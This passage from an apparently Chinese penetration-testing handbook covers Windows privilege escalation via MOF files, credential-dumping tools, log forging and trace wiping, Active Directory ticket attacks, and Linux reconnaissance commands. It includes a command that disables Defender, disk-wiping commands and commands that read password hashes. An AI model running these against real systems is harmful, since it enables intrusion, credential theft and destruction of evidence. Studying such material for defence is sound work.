<li><code class="docutils literal notranslate"><span class="pre">C:\Windows\Temp</span></code> 的子目录，默认情况下用户可以创建文件夹、写入文件</li>
</ul>
<p>具体的ACL信息可用AccessChk, 或者PowerShell的 <code class="docutils literal notranslate"><span class="pre">Get-Acl</span></code> 命令查看。</p>
<p>可以利用对这些文件夹及其子目录的写权限，写入一些可能会被加载的dll，利用dll的加载执行来获取权限。</p>
</div>
<div class="section" id="mof">
<h5>MOF<a class="headerlink" href="#mof" title="永久链接至标题">¶</a></h5>
<p>MOF是Windows系统的一个文件（ <code class="docutils literal notranslate"><span class="pre">c:/windows/system32/wbem/mof/nullevt.mof</span></code> ）叫做&quot;托管对象格式&quot;，其作用是每隔五秒就会去监控进程创建和死亡。</p>
<p>当拥有文件上传的权限但是没有Shell时，可以上传定制的mof文件至相应的位置，一定时间后这个mof就会被执行。</p>
<p>一般会采用在mof中加入一段添加管理员用户的命令的vbs脚本，当执行后就拥有了新的管理员账户。</p>
</div>
<div class="section" id="id17">
<h5>凭证窃取<a class="headerlink" href="#id17" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><dl class="first docutils">
<dt>Windows本地密码散列导出工具</dt>
<dd><ul class="first last">
<li>mimikatz</li>
<li>lsass</li>
<li>wce</li>
<li>gsecdump</li>
<li>copypwd</li>
<li>Pwdump</li>
<li><dl class="first docutils">
<dt>ProcDump</dt>
<dd><ul class="first last">
<li><a class="reference external" href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">https://docs.microsoft.com/en-us/sysinternals/downloads/procdump</a></li>
</ul>
</dd>
</dl>
</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Windows本地密码破解工具</dt>
<dd><ul class="first last">
<li>L0phtCrack</li>
<li>SAMInside</li>
<li>Ophcrack</li>
</ul>
</dd>
</dl>
</li>
<li>彩虹表破解</li>
<li>本机hash+明文抓取</li>
<li>win8+win2012明文抓取</li>
<li>ntds.dit的导出+QuarkPwDump读取分析</li>
<li>vssown.vbs + libesedb + NtdsXtract</li>
<li>ntdsdump</li>
<li>利用powershell(DSInternals)分析hash</li>
<li>使用 <code class="docutils literal notranslate"><span class="pre">net</span> <span class="pre">use</span> <span class="pre">\\%computername%</span> <span class="pre">/u:%username%</span></code> 重置密码尝试次数</li>
<li>限制读取时，可crash操作系统后，在蓝屏的dump文件中读取</li>
</ul>
</div>
<div class="section" id="id18">
<h5>其他<a class="headerlink" href="#id18" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>组策略首选项漏洞</li>
<li>DLL劫持</li>
<li>替换系统工具，实现后门</li>
<li><dl class="first docutils">
<dt>关闭defender</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">Set-MpPreference</span> <span class="pre">-disablerealtimeMonitoring</span> <span class="pre">$true</span></code></li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
</div>
</div>
<span id="document-intranet/wintrace"></span><div class="section" id="windows">
<h3>痕迹清理 - Windows<a class="headerlink" href="#windows" title="永久链接至标题">¶</a></h3>
<div class="section" id="id1">
<h4>日志<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>查看日志 <code class="docutils literal notranslate"><span class="pre">eventvwr</span></code></li>
<li>伪造日志 <code class="docutils literal notranslate"><span class="pre">eventcreate</span></code></li>
<li><dl class="first docutils">
<dt>操作日志</dt>
<dd><ul class="first last">
<li>3389登录列表</li>
<li>文件打开日志</li>
<li>文件修改日志</li>
<li>浏览器日志</li>
<li>系统事件</li>
<li>程序安装记录</li>
<li>程序删除记录</li>
<li>程序更新记录</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>登录日志</dt>
<dd><ul class="first last">
<li>系统安全日志</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>日志路径</dt>
<dd><ul class="first last">
<li>系统日志 <code class="docutils literal notranslate"><span class="pre">%SystemRoot%\System32\Winevt\Logs\System.evtx</span></code></li>
<li>安全日志 <code class="docutils literal notranslate"><span class="pre">%SystemRoot%\System32\Winevt\Logs\Security.evtx</span></code></li>
<li>应用程序日志 <code class="docutils literal notranslate"><span class="pre">%SystemRoot%\System32\Winevt\Logs\Application.evtx</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>服务日志</dt>
<dd><ul class="first last">
<li>IIS <code class="docutils literal notranslate"><span class="pre">%SystemDrive%\inetpub\logs\LogFiles\W3SVC1\</span></code></li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id2">
<h4>注册表<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>AppCompatFlags</li>
<li>Background Activity Moderator (BAM)</li>
<li>MuiCache</li>
<li>RecentApps</li>
<li>RunMRU</li>
<li>ShimCache (AppCompatCache)</li>
</ul>
<div class="section" id="id3">
<h5>注册表键<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>HKEY_LOCAL_MACHINEsystemCurrentControlSetServicesEventlog</li>
</ul>
</div>
</div>
<div class="section" id="id4">
<h4>文件<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
<div class="section" id="prefetch">
<h5>Prefetch<a class="headerlink" href="#prefetch" title="永久链接至标题">¶</a></h5>
<p>预读取文件夹，用来存放系统已访问过的文件的预读信息，扩展名为PF。位置在 <code class="docutils literal notranslate"><span class="pre">C:\Windows\Prefetch</span></code> 。</p>
</div>
<div class="section" id="jumplists">
<h5>JumpLists<a class="headerlink" href="#jumplists" title="永久链接至标题">¶</a></h5>
<p>记录用户最近使用的文档和应用程序，方便用户快速跳转到指定文件，位置在 <code class="docutils literal notranslate"><span class="pre">%APPDATA%\Microsoft\Windows\Recent</span></code> 。</p>
</div>
<div class="section" id="amcache-recentfilecache-bcf">
<h5>Amcache / RecentFileCache.bcf<a class="headerlink" href="#amcache-recentfilecache-bcf" title="永久链接至标题">¶</a></h5>
<p>Windows中的使用这两个文件来跟踪具有不同可执行文件的应用程序兼容性问题，它可用于确定可执行文件首次运行的时间和最后修改时间。</p>
<p>在Windows 7、Windows Server 2008 R2等系统中，文件保存在 <code class="docutils literal notranslate"><span class="pre">C:\Windows\AppCompat\Programs\RecentFileCache.bcf</span></code> ，包含程序的创建时间、上次修改时间、上次访问时间和文件名。</p>
<p>在Windows 8、Windows 10、Windows Server 2012等系统中，文件保存在 <code class="docutils literal notranslate"><span class="pre">C:\Windows\AppCompat\Programs\Amcache.hve</span></code> ，包含文件大小、版本、sha1、二进制文件类型等信息。</p>
</div>
</div>
<div class="section" id="id5">
<h4>时间轴<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h4>
<p>Windows时间轴是Windows 10在1803版中引入的一个新特性，会记录访问过的网站、编辑过的文档、运行的程序等，</p>
</div>
<div class="section" id="id6">
<h4>彻底删除<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>多次覆写文件 <code class="docutils literal notranslate"><span class="pre">cipher</span> <span class="pre">/w:&lt;path&gt;</span></code></li>
<li>格式化某磁盘count次 <code class="docutils literal notranslate"><span class="pre">format</span> <span class="pre">D:</span> <span class="pre">/P:&lt;count&gt;</span></code></li>
</ul>
</div>
</div>
<span id="document-intranet/domain"></span><div class="section" id="id1">
<h3>域渗透<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="active-directory">
<h4>Active Directory<a class="headerlink" href="#active-directory" title="永久链接至标题">¶</a></h4>
<p>活动目录（Active Directory，AD）是面向Windows Server的目录服务。Active Directory存储了有关网络对象的信息，并且让管理员和用户能够查找和使用这些信息。</p>
<div class="section" id="adds">
<h5>ADDS<a class="headerlink" href="#adds" title="永久链接至标题">¶</a></h5>
<p>Active Directory提供目录服务的组件被称作Active Directory域服务（Active Directory Domain Services, ADDS），负责目录数据库的存储、增删改查等工作，可以用在多种局域网、广域网的场景中。</p>
</div>
<div class="section" id="id2">
<h5>名称空间<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<p>名称空间（namespace）是一块界定好的区域，在区域内可以用名称找到与之相关的信息。</p>
</div>
<div class="section" id="id3">
<h5>对象与属性<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<p>ADDS内的资源都是以对象（Object）的形式存在的，对象通过属性（Attrbute）来描述其特征。</p>
</div>
</div>
<div class="section" id="id4">
<h4>域<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
<p>域指将网络中多台计算机逻辑上组织到一起，进行集中管理的逻辑环境。域是组织与存储资源的核心管理单元，在域中，至少有一台域控制器，域控制器中保存着整个域的用户帐号和安全数据库。</p>
<div class="section" id="id5">
<h5>域树<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h5>
<p>域树（Trees）由多个域组成，这些域共享同一表结构和配置，形成一个连续的命名空间（namespace）。</p>
</div>
<div class="section" id="id6">
<h5>林<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h5>
<p>林（Forests）是一个复杂的AD实例，由一个或数个域组成，每个域树都有自己唯一的名称空间。</p>
</div>
<div class="section" id="id7">
<h5>信任<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h5>
<p>两个域之间需要创建信任关系，才可以访问对应域内的资源。</p>
</div>
<div class="section" id="id8">
<h5>域控制器<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h5>
<p>ADDS的目录存储在域控制器内，一个域内可以有多台域控制器，每一个域控制器的地位几乎是平等的，有几乎相同的数据库。</p>
<p>在一台域控制器添加一个用户账户后，这个账户会被自动复制到其他域控制器的数据库中。</p>
<p>AD数据库有多主机复制模式（Multi-master Replication Model）和单主机复制模式（Sing-master Replication Model）。</p>
<p>多主机模式可以直接更新任何一台域控制器内的AD对象，并将更新之后的对象复制到其他域控制器，大部分数据都是用多主机模式进行复制。</p>
<p>单主机复制模式是指由一台被称作操作主机（Operations Master）的域控制器负责接收更改数据的请求，并将数据复制到其他的域控制器。</p>
</div>
<div class="section" id="id9">
<h5>域信任类型<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h5>
<p>Active Directory的信任方式可以分为以下几种：</p>
<ul class="simple">
<li><dl class="first docutils">
<dt>Tree-Root Trust</dt>
<dd><ul class="first last">
<li>双向具有转移性</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Parent-Child Trust</dt>
<dd><ul class="first last">
<li>具有转移性，双向行人</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Forest Trust</dt>
<dd><ul class="first last">
<li>如果两个林创建了信任关系，则林中所有的域都相互信任</li>
<li>两个林之间的信任关系无法自动扩展到其他林上</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Realm Trust</dt>
<dd><ul class="first last">
<li>ADDS域可以和非Windows系统的Kerberos域之间创建信任</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>External Trust</dt>
<dd><ul class="first last">
<li>位于两个林内的域之间可以通过外部信任来创建信任关系</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Shortcut Trust</dt>
<dd><ul class="first last">
<li>可以缩短验证用户身份的时间</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
</div>
<div class="section" id="id10">
<h4>攻击类型<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h4>
<div class="section" id="id11">
<h5>黄金票据利用<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h5>
<p>在认证过程中，经过client与AS的通信会得到TGT，黄金票据（Golden Ticket）就是伪造票据授予票据（TGT），也被称为认证票据。</p>
<p>黄金票据利用需要与DC通信，且需要获取krbtgt的hash，但是可以获取任何Kerbose服务权限。</p>
</div>
<div class="section" id="id12">
<h5>白银票据利用<a class="headerlink" href="#id12" title="永久链接至标题">¶</a></h5>
<p>白银票据（Silver Tickets）伪造利用的是Kerberos认证中的第三个步骤，在第三步的时候，client会带着ticket向server的某个服务进行请求，如果验证通过就可以访问server上的指定服务了，这里的ticket是基于client info、server session key、end time、server hash。这里client info已知，end time可以构造，server session key是TGS生成的，所以只要server的NTLM hash即可。银票伪造的是TGS，只能访问指定的服务。</p>
</div>
<div class="section" id="dcsync">
<h5>DCSync 攻击<a class="headerlink" href="#dcsync" title="永久链接至标题">¶</a></h5>
<p>DCSync是域渗透中经常会用到的技术。DCSync是mimikatz在2015年添加的一个功能，由Benjamin DELPY gentilkiwi和Vincent LE TOUX共同编写，基于 <a class="reference external" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47">DRS</a> 来导出域内所有用户的hash。</p>
<p>这种方式需要满足以下任一一种权限：</p>
<ul class="simple">
<li>Administrators组内的用户</li>
<li>Domain Admins组内的用户</li>
<li>Enterprise Admins组内的用户</li>
<li>域控制器的计算机帐户</li>
</ul>
</div>
<div class="section" id="dcshadow">
<h5>DCShadow 攻击<a class="headerlink" href="#dcshadow" title="永久链接至标题">¶</a></h5>
<p>DCShadow是由来自法国的安全研究人员Benjamin Delpy和Vincent Le Toux在2018年的微软蓝帽（Blue Hat）大会上提出。</p>
<p>DCShadow攻击指在Active Directory环境下创建一个恶意的域控制器，并用它来推送恶意对象。</p>
</div>
<div class="section" id="id13">
<h5>票据传递攻击<a class="headerlink" href="#id13" title="永久链接至标题">¶</a></h5>
<p>票据传递攻击（Pass-the-Ticket Attacks，PtT）是一种使用Kerberos票据代替明文密码或NTLM哈希的方法。PtT最常见的用途可能是使用黄金票据和白银票据，通过PtT访问主机相当简单。</p>
</div>
<div class="section" id="kerberoasting-attacks">
<h5>Kerberoasting Attacks<a class="headerlink" href="#kerberoasting-attacks" title="永久链接至标题">¶</a></h5>
<p>域内的任何一台主机，都可以通过查询SPN，Kerberoasting即是向域内的所有服务请求TGS，然后进行暴力破解。</p>
</div>
<div class="section" id="kerberos-delegation-attacks">
<h5>Kerberos Delegation Attacks<a class="headerlink" href="#kerberos-delegation-attacks" title="永久链接至标题">¶</a></h5>
<p>在一个域中，A使用Kerberos身份验证访问服务B，B再使用A的身份去访问C，这个过程就可以理解为委派。委派主要分为非约束委派（Unconstrained delegation）和约束委派（Constrained delegation）两种，非约束委派可以访问域内任意其它服务，约束委派对认证做了限制不可以访问其他的服务。</p>
<p>Kerberos Delegation（Kerberos委派）攻击分为非约束委派攻击和约束委派攻击。原理都是基于域内已经配置了委派的账户来获取其它账户的权限。</p>
</div>
</div>
</div>
<span id="document-intranet/linux"></span><div class="section" id="linux">
<h3>信息收集 - Linux<a class="headerlink" href="#linux" title="永久链接至标题">¶</a></h3>
<div class="section" id="id1">
<h4>获取内核，操作系统和设备信息<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><dl class="first docutils">
<dt>版本信息</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">uname</span> <span class="pre">-a</span></code> 所有版本</li>
<li><code class="docutils literal notranslate"><span class="pre">uname</span> <span class="pre">-r</span></code> 内核版本信息</li>
<li><code class="docutils literal notranslate"><span class="pre">uname</span> <span class="pre">-n</span></code> 系统主机名字</li>
<li><code class="docutils literal notranslate"><span class="pre">uname</span> <span class="pre">-m</span></code> Linux内核架构</li>
</ul>
</dd>
</dl>
</li>
<li>内核信息 <code class="docutils literal notranslate"><span class="pre">cat</span> <span class="pre">/proc/version</span></code></li>
<li>CPU信息 <code class="docutils literal notranslate"><span class="pre">cat</span> <span class="pre">/proc/cpuinfo</span></code></li>
<li><dl class="first docutils">
<dt>发布信息</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">cat</span> <span class="pre">/etc/*-release</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">cat</span> <span class="pre">/etc/issue</span></code></li>
</ul>
</dd>
</dl>
</li>
<li>主机名 <code class="docutils literal notranslate"><span class="pre">hostname</span></code></li>
<li>文件系统 <code class="docutils literal notranslate"><span class="pre">df</span> <span class="pre">-a</span></code></li>
<li>内核日志 <code class="docutils literal notranslate"><span class="pre">dmesg</span></code> / <code class="docutils literal notranslate"><span class="pre">/var/log/dmesg</span></code></li>
</ul>
</div>
<div class="section" id="id2">
<h4>用户和组<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>列出系统所有用户 <code class="docutils literal notranslate"><span class="pre">cat</span> <span class="pre">/etc/passwd</span></code></li>
<li>列出系统所有组 <code class="docutils literal notranslate"><span class="pre">cat</span> <span class="pre">/etc/group</span></code></li>
<li>列出所有用户hash（root）``cat /etc/shadow``</li>
<li><dl class="first docutils">
<dt>用户</dt>
<dd><ul class="first last">
<li>查询用户的基本信息 <code class="docutils literal notranslate"><span class="pre">finger</span></code></li>
<li>当前登录的用户 <code class="docutils literal notranslate"><span class="pre">users</span></code> <code class="docutils literal notranslate"><span class="pre">who</span> <span class="pre">-a</span></code> <code class="docutils literal notranslate"><span class="pre">/var/log/utmp</span></code></li>
<li>查询无密码用户 <code class="docutils literal notranslate"><span class="pre">grep</span> <span class="pre">'x:0:'</span> <span class="pre">/etc/passwd</span></code></li>
</ul>
</dd>
</dl>
</li>
<li>目前登录的用户 <code class="docutils literal notranslate"><span class="pre">w</span></code></li>
<li>登入过的用户信息 <code class="docutils literal notranslate"><span class="pre">last</span></code> / <code class="docutils literal notranslate"><span class="pre">/var/log/wtmp</span></code></li>
<li>显示系统中所有用户最近一次登录信息 <code class="docutils literal notranslate"><span class="pre">lastlog</span></code> / <code class="docutils literal notranslate"><span class="pre">/var/log/lastlog</span></code></li>
<li>登录成功日志 <code class="docutils literal notranslate"><span class="pre">/var/log/secure</span></code></li>
<li>登录失败日志 <code class="docutils literal notranslate"><span class="pre">/var/log/faillog</span></code></li>
<li>查看特权用户 <code class="docutils literal notranslate"><span class="pre">grep</span> <span class="pre">:0</span> <span class="pre">/etc/passwd</span></code></li>
<li>查看passwd最后修改时间 <code class="docutils literal notranslate"><span class="pre">ls</span> <span class="pre">-l</span> <span class="pre">/etc/passwd</span></code></li>
<li>查看是否存在空口令用户 <code class="docutils literal notranslate"><span class="pre">awk</span> <span class="pre">-F:</span> <span class="pre">'length($2)==0</span> <span class="pre">{print</span> <span class="pre">$1}'</span> <span class="pre">/etc/shadow</span></code></li>
<li>查看远程登录的账号 <code class="docutils literal notranslate"><span class="pre">awk</span> <span class="pre">'/\$1|\$6/{print</span> <span class="pre">$1}'</span> <span class="pre">/etc/shadow</span></code></li>
<li><dl class="first docutils">
<dt>查看具有sudo权限的用户</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">cat</span> <span class="pre">/etc/sudoers</span> <span class="pre">|</span> <span class="pre">grep</span> <span class="pre">-v</span> <span class="pre">&quot;^#\|^$&quot;</span> <span class="pre">|</span> <span class="pre">grep</span> <span class="pre">&quot;ALL=(ALL)&quot;</span></code></li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id3">
<h4>用户和权限信息<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>当前用户 <code class="docutils literal notranslate"><span class="pre">whoami</span></code></li>
<li>当前用户信息 <code class="docutils literal notranslate"><span class="pre">id</span></code></li>
<li>可以使用sudo提升到root的用户（root） <code class="docutils literal notranslate"><span class="pre">cat</span> <span class="pre">/etc/sudoers</span></code></li>
<li>列出目前用户可执行与无法执行的指令 <code class="docutils literal notranslate"><span class="pre">sudo</span> <span class="pre">-l</span></code></li>
</ul>
</div>
<div class="section" id="id4">
<h4>环境信息<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>打印系统环境信息 <code class="docutils literal notranslate"><span class="pre">env</span></code></li>
<li>打印系统环境信息 <code class="docutils literal notranslate"><span class="pre">set</span></code></li>
<li>环境变量中的路径信息 <code class="docutils literal notranslate"><span class="pre">echo</span>&#160; <span class="pre">$PATH</span></code></li>
<li>打印历史命令 <code class="docutils literal notranslate"><span class="pre">history</span></code> / <code class="docutils literal notranslate"><span class="pre">~/.bash_history</span></code></li>
<li>显示当前路径 <code class="docutils literal notranslate"><span class="pre">pwd</span></code></li>
<li>显示默认系统遍历 <code class="docutils literal notranslate"><span class="pre">cat</span> <span class="pre">/etc/profile</span></code></li>
<li>显示可用的shell <code class="docutils literal notranslate"><span class="pre">cat</span> <span class="pre">/etc/shells</span></code></li>
</ul>
</div>
<div class="section" id="id5">
<h4>进程信息<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>查看进程信息 <code class="docutils literal notranslate"><span class="pre">ps</span> <span class="pre">aux</span></code></li>
<li>资源占有情况 <code class="docutils literal notranslate"><span class="pre">top</span> <span class="pre">-c</span></code></li>
<li>查看进程关联文件 <code class="docutils literal notranslate"><span class="pre">lsof</span> <span class="pre">-c</span> <span class="pre">$PID</span></code></li>
<li>完整命令行信息 <code class="docutils literal notranslate"><span class="pre">/proc/$PID/cmdline</span></code></li>
<li>进程的命令名 <code class="docutils literal notranslate"><span class="pre">/proc/$PID/comm</span></code></li>
<li>进程当前工作目录的符号链接 <code class="docutils literal notranslate"><span class="pre">/proc/$PID/cwd</span></code></li>
<li>运行程序的符号链接 <code class="docutils literal notranslate"><span class="pre">/proc/$PID/exe</span></code></li>
<li>进程的环境变量 <code class="docutils literal notranslate"><span class="pre">/proc/$PID/environ</span></code></li>
<li>进程打开文件的情况 <code class="docutils literal notranslate"><span class="pre">/proc/$PID/fd</span></code></li>
</ul>
</div>
<div class="section" id="id6">
<h4>服务信息<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>由inetd管理的服务列表 <code class="docutils literal notranslate"><span class="pre">cat</span> <span class="pre">/etc/inetd.conf</span></code></li>
<li>由xinetd管理的服务列表 <code class="docutils literal notranslate"><span class="pre">cat</span> <span class="pre">/etc/xinetd.conf</span></code></li>
<li>nfs服务器的配置 <code class="docutils literal notranslate"><span class="pre">cat</span> <span class="pre">/etc/exports</span></code></li>
<li>邮件信息 <code class="docutils literal notranslate"><span class="pre">/var/log/mailog</span></code></li>
<li>ssh配置 <code class="docutils literal notranslate"><span class="pre">sshd_config</span></code></li>
</ul>
</div>
<div class="section" id="id7">
<h4>计划任务<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>显示指定用户的计划作业（root） <code class="docutils literal notranslate"><span class="pre">crontab</span> <span class="pre">-l</span> <span class="pre">-u</span> <span class="pre">%user%</span></code></li>
<li><dl class="first docutils">
<dt>计划任务</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">/var/spool/cron/*</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">/var/spool/anacron/*</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">/etc/crontab</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">/etc/anacrontab</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">/etc/cron.*</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">/etc/anacrontab</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>开机启动项</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">/etc/rc.d/init.d/</span></code></li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id8">
<h4>网络、路由和通信<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>列出网络接口信息 <code class="docutils literal notranslate"><span class="pre">/sbin/ifconfig</span> <span class="pre">-a</span></code> / <code class="docutils literal notranslate"><span class="pre">ip</span> <span class="pre">addr</span> <span class="pre">show</span></code></li>
<li>列出网络接口信息 <code class="docutils literal notranslate"><span class="pre">cat</span> <span class="pre">/etc/network/interfaces</span></code></li>
<li>查看系统arp表 <code class="docutils literal notranslate"><span class="pre">arp</span> <span class="pre">-a</span></code></li>
<li>打印路由信息 <code class="docutils literal notranslate"><span class="pre">route</span></code> / <code class="docutils literal notranslate"><span class="pre">ip</span> <span class="pre">ro</span> <span class="pre">show</span></code></li>
<li>查看dns配置信息 <code class="docutils literal notranslate"><span class="pre">cat</span> <span class="pre">/etc/resolv.conf</span></code></li>
<li>打印本地端口开放信息 <code class="docutils literal notranslate"><span class="pre">netstat</span> <span class="pre">-an</span></code></li>
<li>列出iptable的配置规则 <code class="docutils literal notranslate"><span class="pre">iptables</span> <span class="pre">-L</span></code></li>
<li>查看端口服务映射 <code class="docutils literal notranslate"><span class="pre">cat</span> <span class="pre">/etc/services</span></code></li>
<li>Hostname <code class="docutils literal notranslate"><span class="pre">hostname</span> <span class="pre">-f</span></code></li>
<li>查看进程端口情况 <code class="docutils literal notranslate"><span class="pre">netstat</span> <span class="pre">-anltp</span> <span class="pre">|</span> <span class="pre">grep</span> <span class="pre">$PID</span></code></li>
</ul>
</div>
<div class="section" id="id9">
<h4>已安装程序<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">rpm</span> <span class="pre">-qa</span> <span class="pre">--last</span></code> Redhat</li>
<li><code class="docutils literal notranslate"><span class="pre">yum</span> <span class="pre">list</span> <span class="pre">|</span> <span class="pre">grep</span> <span class="pre">installed</span></code> CentOS</li>
<li><code class="docutils literal notranslate"><span class="pre">ls</span> <span class="pre">-l</span> <span class="pre">/etc/yum.repos.d/</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">dpkg</span> <span class="pre">-l</span></code> Debian</li>
<li><code class="docutils literal notranslate"><span class="pre">cat</span> <span class="pre">/etc/apt/sources.list</span></code> Debian APT</li>
<li><code class="docutils literal notranslate"><span class="pre">pkg_info</span></code> xBSD</li>
<li><code class="docutils literal notranslate"><span class="pre">pkginfo</span></code> Solaris</li>
<li><code class="docutils literal notranslate"><span class="pre">pacman</span> <span class="pre">-Q</span></code> Arch Linux</li>
<li><code class="docutils literal notranslate"><span class="pre">emerge</span></code> Gentoo</li>
</ul>
</div>
<div class="section" id="id10">
<h4>文件<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>最近五天的文件 <code class="docutils literal notranslate"><span class="pre">find</span> <span class="pre">/</span> <span class="pre">-ctime</span> <span class="pre">+1</span> <span class="pre">-ctime</span> <span class="pre">-5</span></code></li>
<li>文件系统细节 <code class="docutils literal notranslate"><span class="pre">debugfs</span></code></li>
</ul>
</div>
<div class="section" id="id11">
<h4>公私钥信息<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">~/.ssh</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">/etc/ssh</span></code></li>
</ul>
</div>
<div class="section" id="id12">
<h4>日志<a class="headerlink" href="#id12" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">/var/log/boot.log</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">/var/log/cron</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">/var/log/faillog</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">/var/log/lastlog</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">/var/log/messages</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">/var/log/secure</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">/var/log/syslog</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">/var/log/syslog</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">/var/log/wtmp</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">/var/log/wtmp</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">/var/run/utmp</span></code></li>
</ul>
</div>
<div class="section" id="id13">
<h4>虚拟环境检测<a class="headerlink" href="#id13" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">lsmod</span> <span class="pre">|</span> <span class="pre">grep</span> <span class="pre">-i</span> <span class="pre">&quot;vboxsf\|vboxguest&quot;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">lsmod</span> <span class="pre">|</span> <span class="pre">grep</span> <span class="pre">-i</span> <span class="pre">&quot;vmw_baloon\|vmxnet&quot;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">lsmod</span> <span class="pre">|</span> <span class="pre">grep</span> <span class="pre">-i</span> <span class="pre">&quot;xen-vbd\|xen-vnif&quot;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">lsmod</span> <span class="pre">|</span> <span class="pre">grep</span> <span class="pre">-i</span> <span class="pre">&quot;virtio_pci\|virtio_net&quot;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">lsmod</span> <span class="pre">|</span> <span class="pre">grep</span> <span class="pre">-i</span> <span class="pre">&quot;hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc&quot;</span></code></li>
</ul>
</div>
<div class="section" id="id14">
<h4>容器内信息收集<a class="headerlink" href="#id14" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">capsh</span> <span class="pre">--print</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">cat</span> <span class="pre">/proc/1/cgroup</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">env</span> <span class="pre">|</span> <span class="pre">grep</span> <span class="pre">KUBE</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">ls</span> <span class="pre">-l</span> <span class="pre">.dockerenv</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">ls</span> <span class="pre">-l</span> <span class="pre">/run/secrets/Kubernetes.io/</span></code></li>
